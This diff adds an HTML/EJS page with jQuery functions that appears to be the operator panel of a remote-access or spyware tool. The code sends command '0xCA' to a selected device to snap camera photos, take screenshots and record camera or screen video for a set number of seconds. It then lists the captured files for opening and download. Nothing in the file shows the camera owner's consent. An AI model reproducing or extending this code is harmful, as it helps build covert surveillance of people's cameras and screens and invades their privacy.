@@ -1,0 +1,251 @@
+<style>
+</style>
+
+<div class="ui segment">
+   
+    <div class="ui secondary menu" style="
+        margin-left: 0!important;
+        margin-right: 0!important;">
+
+        <div class="menu" name="menu">
+            <button onclick="Snap(this)" class="ui blue button" style="margin: 0;"> <i
+                    class="icon camera" ></i>Snap</button>
+
+            <select id="camerasID" name="type" size="1" class="selec">
+                <% pageData.forEach((item) => { 
+                if(item.type === undefined ) { %> 
+                    <option value="<%=item.id%>"><%=item.name%></td>
+                <% }}) %>
+                
+            </select>
+
+            <select id="camerasOF" name="type" size="1" class="selec">
+                <option value="1">Online</td>
+                <!--<option value="0">Offline</td>-->
+            </select>
+
+            <button onclick="Screenshot(this)" class="ui blue button" style="margin-left: 3px;"> <i
+                    class="icon camera" ></i>Screenshot</button>
+
+            <button onclick="videoRecord(this)" class="ui red labeled icon button">
+                <i class="video icon"></i>
+                VRecord
+            </button>
+
+            <button onclick="screenRecord(this)" class="ui red labeled icon button disabled">
+                <i class="video icon"></i>
+                SRecord
+            </button>
+        </div>
+        <div class="right menu">
+            <button onclick="updateButton(this, '0xCA', {'action': 'camList'})" class="ui blue button"> <i
+                    class="icon sync"></i>Update Cams</button>
+        </div>
+    </div>
+	<div style="margin-right: .25em";>
+        <div class="ui input fluid">
+            <input type="number" placeholder="Duration (seconds)" min="0" max="120" id="seconds">
+        </div>
+        <div class="ui attached progress indicating active" id="recProg">
+            <div class="bar"></div>
+        </div>
+    </div>
+    <table class="ui sortable celled table">
+        <thead>
+            <tr>
+                <th>Name</th>
+                <th>Date</th>
+                <th class="no-sort">Actions</th>
+            </tr>
+        </thead>
+        <tbody>
+          <% pageData.forEach((item) => { 
+           if(item.type==="photo" || item.type === "screenshot" || item.type==="video") { 
+           	 let date = new Date(item.time); %>
+            <tr>
+                <td><%= item.originalName %></td>
+                <td class="collapsing"><%= date.toLocaleString('ru-RU', { timeZone: 'Asia/Yekaterinburg' }) %></td>
+                <td class="collapsing">
+                    
+                    <div class="ui buttons">
+                    	<a href="<%= item.path %>"
+                            class="ui positive button" target="_blank">Open</a>
+                            <div class="or"> </div>
+                        <a href="<%= item.path %>" download="<%= item.originalName %>"
+                            class="ui positive button">Save</a>
+                    </div>
+                </td>
+            </tr>
+            <% }}) %>
+
+        </tbody>
+    </table>
+
+    <script type="text/javascript">
+        $('table').tablesort();
+
+    	function Screenshot(element) {
+            $(element).children().css("opacity", "0");
+            $(element).addClass('green');
+            $(element).addClass('loading');
+            $('.dlop').addClass('disabled');
+
+            var onl = document.getElementById("camerasOF").value;
+            if(onl == 1){
+                onl=true;
+            }else{
+                onl=false;
+            }
+            sendCommand('0xCA', {
+                action: 'takeScreen',
+                online: onl
+            }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error)
+                        $(element).children().css("opacity", "1");
+                        $(element).removeClass('green');
+                        $(element).removeClass('loading');
+                        $('.dlop').removeClass('disabled')
+                    }, 300)
+                } else {
+                    if (message === 'Requested') {
+                        setTimeout(() => {
+                            $(element).children().css("opacity", "1");
+                            $(element).removeClass('green');
+                            $(element).removeClass('loading');
+                            $('.dlop').removeClass('disabled')
+
+                        	window.location = window.location;
+
+                            showNotification('#2ecc71', 'Take ScreenShot');
+                        }, 300)
+                    }
+                }
+            });
+        }
+        
+        function Snap(element) {
+            $(element).children().css("opacity", "0");
+            $(element).addClass('green');
+            $(element).addClass('loading');
+            $('.dlop').addClass('disabled');
+
+            var id = document.getElementById("camerasID").value;
+            var onl = document.getElementById("camerasOF").value;
+            if(onl == 1){
+                onl=true;
+            }else{
+                onl=false;
+            }
+            sendCommand('0xCA', {
+                action: 'takePic',
+                cameraID: id,
+                online: onl
+            }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error)
+                        $(element).children().css("opacity", "1");
+                        $(element).removeClass('green');
+                        $(element).removeClass('loading');
+                        $('.dlop').removeClass('disabled')
+                    }, 300)
+                } else {
+                    if (message === 'Requested') {
+                        setTimeout(() => {
+                            $(element).children().css("opacity", "1");
+                            $(element).removeClass('green');
+                            $(element).removeClass('loading');
+                            $('.dlop').removeClass('disabled')
+                            showNotification('#2ecc71', 'Take Picture');
+                        }, 300)
+                    }
+                }
+            });
+        }
+
+
+        function videoRecord(element) {
+            $(element).addClass('loading');
+            var id = document.getElementById("camerasID").value;
+            var onl = document.getElementById("camerasOF").value;
+            if(onl == 1){
+                onl=true;
+            }else{
+                onl=false;
+            }
+            let sec = $('#seconds').val();
+            sendCommand('0xCA', {
+                action: 'takeVideo',
+                cameraID: id,
+                online: onl,
+                sec:sec
+            }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error)
+                        $(element).removeClass('loading')
+                    }, 300)
+                } else {
+                    setTimeout(() => {
+                        $(element).removeClass('loading');
+
+                        let timeLeft = ((parseInt(sec) + 10) * 1000);
+                        let timeItsGonnaTake = (parseInt(sec) + 10);
+
+                        if (message === 'Requested') {
+                            showNotification('#2ecc71', 'Now Recording, Check back in ' + timeItsGonnaTake + ' ish Seconds for the result!');
+                            let cdInterval = setInterval(() => {
+                                timeLeft = timeLeft - 100;
+                                let percent = (((timeItsGonnaTake * 1000) * 100) / timeLeft) - 100;
+                                $('#recProg').progress({ percent });
+                                if (percent > 100) window.location = window.location;
+                            }, 100)
+                        } else showNotification('#2ecc71', message);
+                    }, 300)
+                }
+            });
+        }
+
+        function screenRecord(element) {
+            $(element).addClass('loading');
+            var onl = document.getElementById("camerasOF").value;
+            if(onl == 1){
+                onl=true;
+            }else{
+                onl=false;
+            }
+            let sec = $('#seconds').val();
+            sendCommand('0xCA', {
+                action: 'takeScreenR',
+                online: onl,
+                sec:sec
+            }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error)
+                        $(element).removeClass('loading')
+                    }, 300)
+                } else {
+                    setTimeout(() => {
+                        $(element).removeClass('loading');
+
+                        let timeLeft = ((parseInt(sec) + 10) * 1000);
+                        let timeItsGonnaTake = (parseInt(sec) + 10);
+
+                        if (message === 'Requested') {
+                            showNotification('#2ecc71', 'Now Recording, Check back in ' + timeItsGonnaTake + ' ish Seconds for the result!');
+                            let cdInterval = setInterval(() => {
+                                timeLeft = timeLeft - 100;
+                                let percent = (((timeItsGonnaTake * 1000) * 100) / timeLeft) - 100;
+                                $('#recProg').progress({ percent });
+                                if (percent > 100) window.location = window.location;
+                            }, 100)
+                        } else showNotification('#2ecc71', message);
+                    }, 300)
+                }
+            });
+        }
+    </script>
+</div>
